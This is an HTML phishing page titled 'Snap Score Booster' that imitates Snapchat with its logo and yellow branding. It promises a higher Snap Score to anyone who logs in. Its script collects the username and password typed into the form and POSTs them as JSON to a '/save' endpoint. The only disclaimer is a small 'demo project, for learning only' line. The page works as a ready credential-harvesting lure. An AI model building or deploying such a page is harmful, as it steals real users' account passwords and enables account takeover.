<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Snap Score Booster</title>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    }

    body {
      background: #FFFC00;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .container {
      background: white;
      border-radius: 20px;
      padding: 40px 30px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
      text-align: center;
    }

    .logo {
      width: 120px;
      margin: 0 auto 20px;
    }

    h1 {
      font-size: 26px;
      margin-bottom: 10px;
      font-weight: bold;
    }

    p {
      color: #555;
      margin-bottom: 25px;
    }

    input {
      width: 100%;
      padding: 14px;
      margin: 12px 0;
      border: 1px solid #ddd;
      border-radius: 10px;
      font-size: 16px;
      background: #f9f9f9;
    }

    button {
      width: 100%;
      padding: 15px;
      background: #000;
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      cursor: pointer;
      margin-top: 15px;
    }

    button:hover {
      background: #333;
    }

    #msg {
      margin-top: 20px;
      color: green;
      font-weight: bold;
    }

    .note {
      font-size: 12px;
      color: #888;
      margin-top: 20px;
    }
  </style>
</head>
<body>

<div class="container">
  <img class="logo" src="https://upload.wikimedia.org/wikipedia/en/c/c0/Snapchat_Logo.svg" alt="Snap Logo">

  <h1>Snap Score Booster</h1>
  <p>Login to increase your Snap Score fast!</p>

  <input type="text" id="username" placeholder="Username">
  <input type="password" id="password" placeholder="Password">

  <button onclick="sendData()">Log In & Boost Score</button>

  <p id="msg"></p>

  <p class="note">Demo project â€“ for learning only</p>
</div>

<script>
async function sendData() {
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  if(username === "" || password === ""){
    alert("Please fill both fields");
    return;
  }

  const res = await fetch("/save", {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({ username, password })
  });

  const data = await res.text();
  document.getElementById("msg").innerText = data;
}
</script>

</body>
</html>
